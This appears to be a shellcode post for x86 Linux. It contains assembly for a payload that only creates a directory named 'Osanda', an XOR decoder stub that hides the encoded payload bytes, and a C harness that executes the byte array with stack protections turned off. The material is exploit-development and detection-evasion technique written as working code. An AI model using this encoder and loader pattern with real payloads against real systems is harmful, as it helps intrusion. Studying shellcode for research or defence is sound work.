/*
; Author: Osanda Malith Jayathissa (@OsandaMalith)
; This makes the syscall 39 and creates a new directory by the 'Osanda' with the chmod 755

section .text
        global _start

_start:

                  jmp short call_shellcode

shellcode:
                  xor    eax, eax
                  xor    ebx, ebx
                  xor    edx, edx
                  xor    ecx, ecx
                  mov    al, 0x27
                  pop    ebx
                  mov    cx, 0x1ed
                  int    0x80

                   ; exit
                  xor    eax, eax
                  mov    al, 0x1
                  xor    ebx,ebx
                  int    0x80
call_shellcode:
         call   shellcode
        msg: db 0x4f,0x73,0x61,0x6e,0x64,0x61



*/

*/
; Author: Osanda Malith Jayathissa (@OsandaMalith)
; This is XOR decoder stub

section .text
  global _start		

_start:

	jmp short call_decoder

decoder:
	pop esi


decode:
	xor byte [esi], 0xAA
	jz Shellcode
	inc esi
	jmp short decode


call_decoder:

	call decoder
	Shellcode: db 0x41,0xb3,0x9b,0x6a,0x9b,0x71,0x9b,0x78,0x9b,0x63,0x1a,0x8d,0xf1,0xcc,0x13,0x47,0xab,0x67,0x2a,0x9b,0x6a,0x1a,0xab,0x9b,0x71,0x67,0x2a,0x42,0x48,0x55,0x55,0x55,0xe5,0xd9,0xcb,0xc4,0xce,0xcb, 0xaa

*/
/* Author : Osanda Malith Jayathissa (@OsandaMalith)
* gcc -fno-stack-protector -z execstack -o mkdir mkdir.c
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x09\x5e\x80\x36\xaa\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x41\xb3\x9b\x6a\x9b\x71\x9b\x78\x9b\x63\x1a\x8d\xf1\xcc\x13\x47\xab\x67\x2a\x9b\x6a\x1a\xab\x9b\x71\x67\x2a\x42\x48\x55\x55\x55\xe5\xd9\xcb\xc4\xce\xcb\xaa";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
